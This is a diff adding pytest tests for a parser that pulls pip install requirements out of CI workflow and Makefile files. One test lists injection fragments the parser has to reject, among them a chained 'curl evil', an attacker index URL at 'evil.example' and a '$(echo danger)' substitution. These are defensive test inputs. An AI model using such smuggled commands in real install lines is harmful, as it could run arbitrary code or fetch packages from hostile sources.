@@ -128,3 +128,32 @@ def test_unrecognized_adapter_cannot_reinterpret_a_frozen_recipe():
     value["resolver_versions"]["adapter"] = "python-toolchain-v999"
     with pytest.raises(ValueError, match="environment_adapter_version_unsupported"):
         VerificationEnvironmentContract.model_validate_json(json.dumps(value))
+
+
+def test_literal_ci_requirements_keep_inline_versions_constraints_lines_and_root_cwd():
+    from app.environment_engine.python import declared_pip_inputs
+    files = {".github/workflows/checks.yml": "jobs:\n  test:\n    steps:\n      - run: |\n          python -m pip install -U 'ruff>=0.8,<1' -r deps/tools.txt --constraint=pins.txt\n",
+        "deps/tools.txt": "mypy>=1\n", "pins.txt": "mypy==1.15.0\nunused==4\n"}
+    source = FrozenSource(evidence(files))
+    roots, constraints, inline = declared_pip_inputs(source, ".")
+    assert roots == ["deps/tools.txt"] and constraints == ["pins.txt"]
+    assert inline[0].requirement == "ruff<1,>=0.8"
+    assert inline[0].source.path == ".github/workflows/checks.yml" and inline[0].line == 5
+    all_values = [*inline, *requirements(source, roots, constraint_roots=constraints)]
+    assert [(d.distribution, d.constraint) for d in all_values] == [("ruff", False), ("mypy", False), ("mypy", True), ("unused", True)]
+
+
+@pytest.mark.parametrize("fragment", ["ruff > result", "ruff && curl evil", "--index-url https://evil.example ruff", "-e ../other", "ruff $(echo danger)"])
+def test_inline_ci_shell_and_installer_options_are_not_interpreted(fragment):
+    from app.environment_engine.python import declared_pip_inputs
+    source = FrozenSource(evidence({".github/workflows/checks.yml": "- run: pip install " + fragment + "\n"}))
+    with pytest.raises(ResolutionError):
+        declared_pip_inputs(source, ".")
+
+
+def test_selected_project_self_install_is_not_an_external_dependency_or_host_execution():
+    from app.environment_engine.python import declared_pip_inputs
+    source = FrozenSource(evidence({"pkg/Makefile": "env:\n\tpython -m pip install -e .\n\tpip install pytest\n"}))
+    roots, constraints, inline = declared_pip_inputs(source, "pkg")
+    assert not roots and not constraints
+    assert [d.distribution for d in inline] == ["pytest"]
